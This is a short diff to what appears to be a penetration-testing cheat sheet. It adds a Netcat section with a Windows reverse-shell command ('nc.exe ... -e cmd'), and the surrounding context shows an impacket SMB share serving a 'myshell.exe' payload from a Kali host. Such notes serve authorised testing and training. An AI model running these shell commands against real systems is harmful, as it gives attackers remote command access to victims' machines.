@@ -43,6 +43,12 @@ impacket-smbserver -smb2support kali $PWD
 //<kali-ip>/kali/myshell.exe
 ```
 
+##### Netcat
+
+```
+nc.exe <listening_host> <listening_port> -e cmd
+```
+
 ##### Powershell
 
 ```
